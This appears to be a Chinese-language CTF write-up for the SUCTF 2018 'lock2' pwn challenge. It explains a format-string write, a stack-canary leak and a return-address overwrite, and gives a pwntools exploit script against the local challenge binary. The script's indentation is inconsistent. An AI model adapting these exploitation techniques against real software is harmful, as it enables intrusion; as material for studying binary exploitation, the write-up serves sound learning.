---
title: '2018-SUCTF-lock2-[fmt,栈溢出,Canary]'
date: 2019-04-04 22:13:08
tags: [64bit,格式化字符串漏洞,栈溢出,Canary]
---

## 0x00 程序分析


```c
Canary                        : Yes
NX                            : Yes
PIE                           : Yes
Fortify                       : No
RelRO                         : Partial
```

根据题目逻辑，通过格式化字符串将3个地址覆盖成相应内容后，就可以进入一个叫final的函数，其中存在栈溢出，将final函数的返回地址覆盖成一个叫flag的函数，就可以获得flag了。在覆盖返回地址时，需要通过栈溢出获得Canary的值，再把值写入rbp下面(Canary比rbp地址低)

## 0x01 EXP

```python
#/usr/bin/env python
from pwn import *
p = process('./lock2')
DEBUG = 0
VERBOSE = 1
if DEBUG:
	gdb.attach(p)
if VERBOSE:
	context(log_level = 'debug')

def pwn():
	p.recvuntil('password:')
	p.sendline('123456')
	p.recvuntil('K  ')
  #获得门锁地址
  keyaddr = int(p.recvuntil('--------',drop=True),16)
  #将三个地址覆盖为真(2)
	p.recvuntil('cmd:')
	p.sendline('aa%7$naa'+p64(keyaddr))#C0
	p.recvuntil('invalid')
	p.recvuntil('cmd:')
  p.sendline('aa%7$naa'+p64(keyaddr+4))#C4
	p.recvuntil('invalid')
	p.recvuntil('cmd:')
  p.sendline('aa%7$naa'+p64(keyaddr+0x14))#D4
  p.recvuntil('invalid')
  #获得flag函数地址
	p.recvuntil('The Pandora Box:',drop=True)
	flag = int(p.recvuntil('\n',drop=True),16)
  #将\x00覆盖，多打印出栈上的地址，包括Canary
	p.recvuntil('Tell me your name:')
	p.sendline('b'*0x18)
	p.recvuntil('b'*0x18+'\x0a')
	Canary = u64(p.recv(7).rjust(8,'\x00'))
  #覆盖函数返回地址
	p.sendline('c'*34+p64(Canary)+'rbprbprb'+p64(flag))
	p.interactive()
if __name__ == '__main__':
	pwn()
```

